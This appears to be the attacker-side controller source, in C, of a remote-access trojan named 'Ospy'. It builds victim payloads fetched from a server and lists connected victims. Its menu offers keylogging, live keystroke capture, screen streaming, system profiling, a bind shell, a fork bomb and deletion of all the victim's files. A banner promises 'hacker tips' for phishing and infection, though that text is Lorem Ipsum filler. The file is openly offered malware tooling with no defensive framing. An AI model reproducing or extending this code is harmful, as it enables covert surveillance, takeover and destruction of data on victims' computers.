#include "attack_mode.h"
#include "connection.h"
#include "utilities.h"
#include "md5.h"

main_data data;
char connected_victims[MAX_VICTIMS_PER_ATTACKER][MAX_USER_NAME_LEN];

bool valid_victim_name (char * victim_name){
	for (int i = 0; i < strlen(victim_name); i++){
		if (!((victim_name[i] >= 'a' && victim_name[i] <= 'z') || (victim_name[i] >= 'A' && victim_name[i] <= 'Z') || victim_name[i] == '_' || (victim_name[i] >= '0' && victim_name[i] <= '9')))
			return false;
	}
	return true;
}

extern char attacker_username[MAX_USER_NAME_LEN];
void create_new_payload(){
	char pwd[100];
	getcwd(pwd, sizeof(pwd)); // set in "pwd" the current path
	
	FILE * config_file;
	char victim_name[MAX_USER_NAME_LEN];
	char commend[MAX_USER_NAME_LEN  + 40];
	char payload_folder_path[15 + MAX_USER_NAME_LEN];
	do {
		print_small_banner();
		printf("\n[✚] create new payload ....\n");
		printf("    Enter vicim name : ");
		safe_scan(&victim_name, MAX_USER_NAME_LEN);
		if (valid_victim_name(victim_name))
			break;
		else {
			printf("\n[-] \033[31;1mInvalid input, victim name may include 'a'-'z', 'A'-'Z', '_' only\033[0m\n");
			press_enter_to_continue();
		} 		
	} while (1);
	
	// request the payload from the server
	A_2_S_encrypted_message_handler(data, GET_VICTIM_PAYLOAD);
	recv_file(victim_name, "payload", "", "payload");
		
	/*
	create the config file
	the config file will look like :
		ori_mac_mini ( this is the victim_name)
		16b1c83de8f9518e673838b2d6ea75dc ( this is the md5 hash of the name of the attacker)
	*/
	sprintf(commend, "Ospy/%s/payload/config",victim_name);
	config_file = fopen(commend, "wt");
	fprintf(config_file, "%s\n", victim_name); 
	fprintf(config_file, "%s", md5(attacker_username)); 
	fclose(config_file);	
	
	print_small_banner();
	printf("\033[31;1m███████▀▀▀░░░░░░░▀▀▀███████\033[0m  \033[32;1mYES ! the payload saved successfully.\033[0m\n\033[31;1m████▀░░░░░░░░░░░░░░░░░▀████\033[0m  You can find the payload in Ospy folder.\n\033[31;1m███│░░░░░░░░░░░░░░░░░░░│███\033[0m  [»] Ospy folder path : %s/Ospy\n\033[31;1m██▌│░░░░░░░░░░░░░░░░░░░│▐██\033[0m\n\033[31;1m██░└┐░░░░░░░░░░░░░░░░░┌┘░██\033[0m  \033[4;37m\033[1m\033[37mHere some hacker tips for great Ospy infect :\033[0m\n\033[31;1m██░░└┐░░░░░░░░░░░░░░░┌┘░░██\033[0m\n\033[31;1m██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██\033[0m  * \x1B[36mfishing\033[0m\n\033[31;1m██▌░│██████▌░░░▐██████│░▐██\033[0m    is simply dummy text of the printing and\n\033[31;1m███░│▐███▀▀░░▄░░▀▀███▌│░███\033[0m    typesetting industry. Lorem Ipsum has been\n\033[31;1m██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██\033[0m    the industrysstandard dummy\n\033[31;1m██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██\033[0m  * \x1B[36minfect\033[0m\n\033[31;1m████▄─┘██▌░░░░░░░▐██└─▄████\033[0m    is simply dummy text of the printing and\n\033[31;1m█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████\033[0m    typesetting industry. Lorem Ipsum has been\n\033[31;1m████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████\033[0m\n\033[31;1m█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████\033[0m\n\033[31;1m███████▄░░░░░░░░░░░▄███████\033[0m\n\033[31;1m██████████▄▄▄▄▄▄▄██████████\033[0m  GOOD LUCK\n",pwd);
}

void choose_attack_menu (){
	print_small_banner();
	printf("\033[4;37mChoose action :\033[0m\n\n");
	printf("[1] \033[96mGet %s's keylogger history file\033[0m\n", selected_victim_name);
	printf("[2] \033[96mGet %s's live keystrokes\033[0m\n", selected_victim_name);
	printf("[3] \033[96mGet %s's screen stream\033[0m\n", selected_victim_name);
	printf("[4] \033[96mGet %s's system profiler file\033[0m\n", selected_victim_name);
	printf("[5] \033[96mSend %s's computer command (bind shell)\033[0m\n", selected_victim_name);
	printf("[6] \033[96mStuck %s's computer (Fork boom)\033[0m\n", selected_victim_name);
	printf("[7] \033[96mDelete %s's all files\033[0m\n", selected_victim_name);
	printf("[8] \033[96mSelect other victim\033[0m\n");
	printf("[9] \033[96mExit Ospy\033[0m\n\n");
}

void print_all_connected_victims(){
	print_small_banner();
	A_2_S_encrypted_message_handler(data, GET_CONNECTED_VICTM);
	printf("\033[4;37m\033[1m\033[37mSelect victim or other option - \033[0m\n");
	printf("\n  \033[4;37mConnected victims list : \033[0m\n");
	recv(attacker_socket, &connected_victims, sizeof(connected_victims), 0);
	for(int i = 0; i < MAX_VICTIMS_PER_ATTACKER; i++){
		if (strcmp(connected_victims[i], "") != 0)
			printf("    [%d] %s\n", i, connected_victims[i]);
		fflush(stdout);
	}		
	printf("\n  \033[4;37mOther options - \033[0m\n");
	printf("    [A] Add new victim\n");
	printf("    [R] Reload connected victims list\n");
	printf("    [E] Exit Ospy\n");
}

void choose_victim (){
	int attacker_selection;
	while (true) {
		print_all_connected_victims();
		
		printf("\n\033[35;1m-> \033[0m");
		flush_stdin();
		attacker_selection = getchar();
		
		if (attacker_selection == 'A' || attacker_selection == 'a' || attacker_selection == 'R' || attacker_selection == 'r' || attacker_selection == 'E' || attacker_selection == 'e')
			break;
			
		if (attacker_selection < '0' || attacker_selection > '9'){
			printf("\n[-] \033[31;1mInvalid input, try again...\033[0m\n");
			sleep(2);
			continue;
		}
		if (strcmp(connected_victims[attacker_selection - '0'], "") != 0)
			break;
			
		printf("\n[-] \033[31;1mNo such victim, try again...\033[0m\n");
		sleep(2);
	}
	
	if (attacker_selection == 'R' || attacker_selection == 'r'){
		printf("\n[⧖] Reloading....\n");
		sleep(1);
		choose_victim();
	}
	else if (attacker_selection == 'A' || attacker_selection == 'a'){
		create_new_payload();
		press_enter_to_continue();
		choose_victim();
	}
	else if (attacker_selection == 'E' || attacker_selection == 'e'){
		exit(1);
	}
	else {
		#ifdef USER_MESSAGE_PROMPT
		connecting_load();
		#endif
		
		strcpy(data.selected_victim_name, connected_victims[attacker_selection - '0']);
		strcpy(selected_victim_name, connected_victims[attacker_selection - '0']); // for later use
		A_2_S_encrypted_message_handler(data, SELECT_VICTIM);
	}	
}